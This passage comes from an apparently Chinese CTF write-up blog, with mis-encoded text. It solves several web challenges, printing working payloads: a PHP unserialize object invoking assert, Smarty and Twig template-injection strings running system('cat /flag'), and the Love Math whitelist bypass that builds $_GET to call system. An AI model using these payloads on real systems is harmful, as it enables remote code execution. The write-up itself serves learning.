invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br></code></pre></td></tr></table></figure>
<p>æ²¡å•¥å¥½åˆ†æçš„ï¼Œç›´æ¥èµ‹å€¼åºåˆ—åŒ–</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$c</span>-&gt;b=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-string">&quot;phpinfo()&quot;</span>;<br>echo serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-regexp">//</span>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;HelloPhp&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œ__destructä¼šè¢«è°ƒç”¨<br>ä¹Ÿå°±æ˜¯</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">echo</span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">assert</span></span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);</span><br></code></pre></td></tr></table></figure>
<p>assertä¸evalçš„åŠŸèƒ½åŸºæœ¬ç›¸åŒï¼Œä½†ä¸éœ€è¦åé¢åŠ <code>;</code><br>è¿˜æœ‰å‚æ•°sourceä¸èƒ½å‡ºç°ï¼Œä¸ç„¶die(0)ä¼šç›´æ¥ç»“æŸè„šæœ¬<br>payload</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?d</span>ata=<span class="hljs-symbol">O:</span><span class="hljs-number">8</span><span class="hljs-symbol">:<span class="hljs-string">&quot;HelloPhp&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;a&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">9</span><span class="hljs-symbol">:<span class="hljs-string">&quot;phpinfo()&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;b&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">6</span><span class="hljs-symbol">:<span class="hljs-string">&quot;assert&quot;</span></span>;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/YCMFTEQZQ5AMTYVRU31.png" srcset="/img/loading.gif" lazyload><br>è¯¦ç»†â€“&gt;<a target="_blank" rel="noopener" href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">evalä¸assert</a>&lt;â€“</p>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p><img src="/images/G35F0ZJN35S68IL67.png" srcset="/img/loading.gif" lazyload><br>æ£€ç´¢é¡µé¢å‘ç°æœ‰ä¸ªæ˜¾ç¤ºipçš„åœ°æ–¹<br>å…ˆåº·åº·èƒ½ä¸èƒ½xffä¼ªé€ ä¸‹ip<br><img src="/images/J3D1FCKLD0WT7OLY5XN.png" srcset="/img/loading.gif" lazyload><br>è¿™æ—¶çœ‹åˆ°æœ€ä¸‹é¢æ˜¾ç¤º<br>Build With Smarty !<br>Smartyæ˜¯ä¸€ä¸ªPHPçš„æ¨¡æ¿å¼•æ“ï¼Œæä¾›è®©ç¨‹åºé€»è¾‘ä¸é¡µé¢æ˜¾ç¤ºï¼ˆHTML&#x2F;CSSï¼‰ä»£ç åˆ†ç¦»çš„åŠŸèƒ½ã€‚è¯¥æ¡†æ¶å‡ºç°è¿‡SSTIæ¼æ´<br>sstiå…ˆä¸Šä¸€å¼ å›¾<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png" srcset="/img/loading.gif" lazyload><br>æµ‹è¯•<code>a&#123;*comment*&#125;b</code><br><img src="/images/RJAZ6GRSWBE8ZLSC6R.png" srcset="/img/loading.gif" lazyload><br>æŒ‰ç…§æ­£å¸¸é€»è¾‘ï¼Œåº”è¯¥ç”¨phpè¯­è¨€å»æŸ¥æ‰¾flagã€‚ä¸€èˆ¬æƒ…å†µä¸‹è¾“å…¥{$smarty.version}å°±å¯ä»¥çœ‹åˆ°è¿”å›çš„smartyçš„ç‰ˆæœ¬å·ã€‚è¯¥é¢˜ç›®çš„Smartyç‰ˆæœ¬æ˜¯3.1.30<br><img src="/images/DY839XW0HNZF8LACB1OZG.png" srcset="/img/loading.gif" lazyload><br>åœ¨Smarty3çš„å®˜æ–¹æ‰‹å†Œé‡Œæœ‰ä»¥ä¸‹æè¿°:<br>Smartyå·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚æ‰€ä»¥åªèƒ½å¦æ‰¾æ–¹æ³•<br><strong>{if}æ ‡ç­¾</strong><br>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š<br>smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{&#x2F;if}ä¹Ÿå¯ä»¥ä½¿ç”¨{else}å’Œ{elseif}.å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||*,or,&amp;&amp;,and,is_array()ï¼Œç­‰ç­‰ã€‚ã€‚ã€‚æ‰€ä»¥ä¹Ÿå¯ä»¥ä½¿ç”¨<code>&#123;if show_source(&quot;/flag&quot;)&#125;&#123;/if&#125;</code>æ¥è·å¾—flag<br><img src="/images/NGOSYM3EL5ZN0KAAQ.png" srcset="/img/loading.gif" lazyload><br>æˆ–æ˜¯</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;<span class="hljs-keyword">if</span> system(&#x27;cat flag&#x27;)&#125;</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">if</span>&#125;</span><br></code></pre></td></tr></table></figure>
<p>åœ¨å‰é¢çš„æ¨¡æ¿å›¾ä¸­æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•<br>xffä¸­è¾“å…¥</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/VYY7B6N5IKE3WV71CVL.png" srcset="/img/loading.gif" lazyload><br>å†è¾“å…¥</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>å›æ˜¾ä¸º49<br>ç¡®å®šä¸ºtwigæ¨¡æ¿<br>RCE</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//css index.php smarty templates_c xff</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>flagåœ¨æºç ä¸­ğŸ‘€</p>
<h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>å¾ˆæœ‰æ„æ€çš„é¢˜ï¼Œç…§ç€ç­”æ¡ˆ+chatåˆ†æäº†å¾ˆä¹…ï¼Œé•¿è§è¯†äº†ğŸ˜Š</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125; <br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªç›´æ¥è¿‡ï¼Œä¸€èˆ¬ä¸ä¼šè¶…è¿‡80ä¸ªå­—ç¬¦çš„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure>
<p>ç»™äº†ä¸ªé»‘åå•å…ˆä¸ç®¡</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br>    foreach ($used_funcs<span class="hljs-literal">[<span class="hljs-number">0</span>]</span> <span class="hljs-keyword">as</span> $func) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">in</span><span class="hljs-constructor">_array($<span class="hljs-params">func</span>, $<span class="hljs-params">whitelist</span>)</span>) &#123;<br>            die(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure>


<p>åˆç»™äº†ä¸ªç™½åå•ï¼Œifé‡Œçš„æ„æ€ä¸ºå¾—æœ‰ç™½åå•é‡Œçš„å‡½æ•°</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">$used</span>_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">$func</span><br></code></pre></td></tr></table></figure>
<p>å¤ªæŠ½è±¡äº†ï¼Œå…ˆç†è§£ä¸ºæ£€ç´¢ç™½åå•<br>ä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ã€‚<br>ç†æƒ³ä¸­çš„ä¼ å‚æ˜¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[a])(<span class="hljs-variable">$_GET</span>[b])&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿™é‡Œçš„a,béƒ½ä¸æ˜¯ç™½åå•é‡Œçš„ï¼Œè¿™é‡Œæ›¿æ¢ä¸€ä¸‹</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">pi</span>])(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">abs</span>])&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„_GETæ˜¯æ— æ³•è¿›è¡Œç›´æ¥æ›¿æ¢ï¼Œè€Œä¸”[]ä¹Ÿè¢«é»‘åå•è¿‡æ»¤äº†<br>çœ‹çœ‹ç™½åå•æœ‰ä»€ä¹ˆå¯ä»¥ç”¨çš„å‡½æ•°<br><strong>hex2bin()å‡½æ•°</strong><br>hex2bin()å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCiiå­—ç¬¦<br>æŠŠ_GETè½¬åŒ–ä¸ºåå…­è¿›åˆ¶<br><img src="/images/DJQB0VOJ373PVHM.png" srcset="/img/loading.gif" lazyload><br>hex2bin(5f 47 45 54)å°±æ˜¯_GET,ä½†æ˜¯hex2bin()å‡½æ•°ä¹Ÿä¸æ˜¯ç™½åå•é‡Œé¢çš„ï¼Œè€Œä¸”è¿™é‡Œçš„5f 47 45 54ä¹Ÿä¸èƒ½ç›´æ¥å¡«å…¥ï¼Œè¿™é‡Œä¼šè¢«</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br></code></pre></td></tr></table></figure>
<p>æ¥è¿›è¡Œç™½åå•çš„æ£€æµ‹<br>è¿™é‡Œçš„hex2bin()å‡½æ•°å¯ä»¥é€šè¿‡base_convert()å‡½æ•°æ¥è¿›è¡Œè½¬æ¢<br>base_convert()å‡½æ•°èƒ½å¤Ÿåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—<br>base_convert(37907361743,10,36)ç­‰äºhex2bin(åˆ«é—®ä¸ºä»€ä¹ˆæ˜¯36è¿›åˆ¶ï¼Œé—®å°±æ˜¯è¿™ä¹ˆè½¬æ¢ä¼šç­‰äºhex2binğŸ˜Š)<br><img src="/images/ZIZM27JBL9XG2SZ5Y.png" srcset="/img/loading.gif" lazyload></p>
<p>é‡Œé¢çš„5f 47 45 54è¦ç”¨dechex()å‡½æ•°å°†10è¿›åˆ¶è½¬æ¢ä¸º16è¿›åˆ¶çš„æ•°<br>dechex(1598506324),1598506324è½¬æ¢ä¸º16è¿›åˆ¶å°±æ˜¯5f 47 45 54<br><img src="/images/QEKBJT3PLILCFXS6L7BG.png" srcset="/img/loading.gif" lazyload></p>
<p>payload</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">/?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure>
<p><img src="/images/B5YT537OKAX6WR7R5O.png" srcset="/img/loading.gif" lazyload><br>flagå‡ºæ¥äº†ï¼Œå†è¯¦ç»†åˆ†æä¸‹<br>ä»å‰å¾€å</p>
<p>base_convert(37907361743,10,36)-&gt;hex2bin</p>
<p>dechex(1598506324)-&gt;5f 47 45 54</p>
<p>$pi&#x3D;hex2bin(5f 47 45 54)-&gt;$pi&#x3D;_GET</p>
<p>ç®¡é“ç¬¦;è¿æ¥</p>
<p>($$pi){pi}(($$pi){abs})</p>
<p>($_GET){pi}(($_GET){abs})</p>
<p>è¿™ä¸ªè¡¨è¾¾å¼å®é™…ä¸Šä¼šå°è¯•æ‰§è¡Œ$_GET(pi)($_GET(abs))</p>
<p>æ‰€ä»¥æ­¤æ—¶cçš„å€¼ä¸ºc&#x3D;_GET$_GET(pi)($_GET(abs))</p>
<p>åé¢æœ‰å¯¹piå’Œabsèµ‹å€¼ï¼Œå¸¦å…¥</p>
<p>c&#x3D;system(cat &#x2F;flag)</p>
<h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>å¥½ç®€å•ï¼Œå°±è—åœ¨æºä»£ç é‡Œ<br><img src="/images/IB0WVFS4XJ9N847G.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>å¹¶ä¸æ˜¯sqlæ³¨å…¥å’Œxss<br>ä¸€å®šè¦æ³¨æ„é¢˜ç›®ç»™çš„æç¤º<br>è¾“å…¥usernameå’Œpasswordï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»¥GETæ–¹å¼å‘é€çš„<br>è·å–å…³é”®è¯cookie<br>å°è¯•ç”¨cookieç™»å½•<br><img src="/images/DAMXIM6X4N91NEI.png" srcset="/img/loading.gif" lazyload><br>&amp;password&#x3D;123å¤šä½™äº†<br>å»æ‰è¯•è¯•<br><img src="/images/FZ806UV2QR1V9VG2.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>sqlæ³¨ä¸å‡ºæ¥ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰æ•ˆçš„ä¿¡æ¯<br>ç”¨dirsearchæ‰«ä¸€æ‰«<br>æ²¡æœ‰æ‰«å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œå¯èƒ½æ˜¯æˆ‘çš„dirsearchå¤ªä½çº§äº†<br>çœ‹äº†ä¸‹åˆ«äººçš„åšå®¢ï¼Œdirsearchæ‰«å‡ºäº†index.php.swp<br>æ‰¾åˆ°äº†æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">ob_start</span>();<br>	<span class="hljs-function"><span 